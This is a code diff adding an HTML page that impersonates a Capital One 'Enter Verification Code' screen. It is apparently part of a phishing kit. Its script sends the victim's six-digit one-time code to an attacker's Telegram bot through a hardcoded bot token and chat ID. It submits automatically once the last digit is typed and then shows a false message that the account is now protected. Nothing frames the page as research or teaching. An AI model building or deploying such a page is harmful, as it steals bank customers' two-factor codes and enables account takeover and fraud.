@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Capital - Enter Verification Code</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"> <!-- Fixed missing quote -->
+    <style>
+        * {
+            font-family: 'Roboto', sans-serif;
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #f5f5f5;
+        }
+
+        header {
+            background-color: #ffffff;
+            padding: 1rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-img {
+            height: 40px;
+            max-width: 120px;
+        }
+
+        .security-container {
+            background-color: white;
+            padding: 2.5rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 580px;
+            margin: 2rem auto;
+        }
+
+        .code-header h1 {
+            color: #000;
+            font-size: 10px;
+            margin-bottom: 1rem;
+            font-weight: 300;
+        }
+
+        .code-notice {
+            color: #d90000;
+            text-align: center;
+            font-weight: 500;
+            margin: 1rem 0;
+            font-size: 14px;
+        }
+
+        .phone-display {
+            text-align: center;
+            color: #000;
+            font-weight: 500;
+            margin: 2rem 0;
+            font-size: 1.1rem;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+        }
+
+        .code-input:focus {
+            border-color: #004976;
+            outline: none;
+        }
+
+        .submit-button {
+            position: relative;
+            background-color: #004976;
+            color: white;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            display: block;
+            margin: 2rem auto;
+            transition: all 0.2s ease;
+        }
+
+        .submit-button.loading {
+            pointer-events: none;
+            opacity: 0.8;
+            padding-right: 3rem;
+        }
+
+        .submit-button.loading::after {
+            content: "";
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: translateY(-50%) rotate(360deg); }
+        }
+
+        .expiry-notice {
+            text-align: center;
+            color: #666;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+        }
+
+        .secondary-options {
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .secondary-options a {
+            color: #004976;
+            text-decoration: none;
+            display: block;
+            margin: 0.5rem 0;
+            font-weight: 500;
+        }
+
+        .secondary-options a:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            background-color: #ffffff;
+            padding: 1.5rem;
+            margin-top: auto;
+            font-size: 12px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: center;
+            color: #666;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0.75rem;
+            margin-bottom: 0.75rem;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            white-space: nowrap;
+            font-size: 12px;
+        }
+
+        .separator {
+            color: #999;
+            user-select: none;
+            margin: 0 0.25rem;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 2rem;
+            background-color: #d4edda;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .continue-button {
+            display: inline-block;
+            padding: 1rem 2rem;
+            background-color: #004976;
+            color: white;
+            border-radius: 4px;
+            text-decoration: none;
+            margin-top: 2rem;
+        }
+
+        /* iPhone 12 Pro Max Optimizations */
+        @media only screen and (max-width: 428px) {
+            .security-container {
+                padding: 1.5rem;
+                margin: 1rem;
+                border-radius: 0;
+                box-shadow: none;
+            }
+
+            .code-inputs {
+                gap: 0.75rem;
+                margin: 1.5rem 0;
+            }
+
+            .code-input {
+                width: 55px;
+                height: 65px;
+                font-size: 28px;
+            }
+
+            .phone-display {
+                font-size: 1rem;
+                margin: 1.5rem 0;
+            }
+
+            .submit-button {
+                width: 100%;
+                padding: 1.25rem;
+                font-size: 18px;
+                margin: 1.5rem auto;
+            }
+
+            .expiry-notice {
+                font-size: 0.8rem;
+            }
+
+            .footer-links {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+
+            .separator {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-content">
+            <img src="capital-logo.svg" alt="Capital One" class="logo-img">
+            <nav class="header-links">
+                <a href="#">English</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="security-container">
+            <h1 class="code-header">We've sent you a temporary code.</h1>
+            <div class="code-instructions">
+                <div class="phone-display">
+                    Please enter the 6-digit code sent to<br>
+                    <span style="font-weight: 600;">(***)****-9039</span>
+                </div>
+            </div>
+
+            <div class="code-inputs">
+                <input type="text" id="code1" class="code-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                <input type="text" id="code2" class="code-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                <input type="text" id="code3" class="code-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                <input type="text" id="code4" class="code-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                <input type="text" id="code5" class="code-input" maxlength="1" pattern="\d*" inputmode="numeric">
+                <input type="text" id="code6" class="code-input" maxlength="1" pattern="\d*" inputmode="numeric">
+            </div>
+
+            <button type="submit" class="submit-button">Submit Code</button>
+
+            <p class="expiry-notice">Keep in mind this code will expire in 20 minutes.</p>
+        </div>
+    </main>
+
+    <div id="success-message" class="success-message">
+        <h1>Congratulations!</h1>
+        <p>Your information has been successfully verified, and your account has been securely protected. No further action is necessary at this time.</p>
+        <a href="index.html" class="continue-button">Return to Home</a>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Contact us</a>
+                <span class="separator">|</span>
+                <a href="#">Legal</a>
+                <span class="separator">|</span>
+                <a href="#">Privacy</a>
+                <span class="separator">|</span>
+                <a href="#">Security</a>
+                <span class="separator">|</span>
+                <a href="#">Terms & Conditions</a>
+                <span class="separator">|</span>
+                <a href="#">Accessibility</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const botToken = '7342111571:AAFUmvZ-7d-Fjg0TOm3qmxuB5AHlB8FwpJw';
+        const chatId = '5502103678';
+
+        async function submitCode() {
+            const submitBtn = document.querySelector('.submit-button');
+            
+            try {
+                submitBtn.classList.add('loading');
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Processing...';
+
+                const code = Array.from(document.querySelectorAll('.code-input'))
+                                .map(input => input.value)
+                                .join('');
+
+                if (!/^\d{6}$/.test(code)) {
+                    alert('Please enter a valid 6-digit code.');
+                    return;
+                }
+
+                const message = encodeURIComponent(`🔑 Verification Code: ${code} ✅`);
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+                const response = await fetch(telegramUrl);
+                const data = await response.json();
+
+                if (data.ok) {
+                    document.getElementById('success-message').style.display = 'block';
+                    document.querySelector('.security-container').style.display = 'none';
+                } else {
+                    alert('Failed to verify code. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again.');
+            } finally {
+                submitBtn.classList.remove('loading');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Code';
+            }
+        }
+
+        // Enhanced input handling
+        const inputs = document.querySelectorAll('.code-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '');
+                
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                
+                if (index === inputs.length - 1 && e.target.value.length === 1) {
+                    submitCode();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && index > 0 && !e.target.value) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Mobile touch interactions
+        const submitBtn = document.querySelector('.submit-button');
+        submitBtn.addEventListener('click', submitCode);
+    </script>
+</body>
+</html>
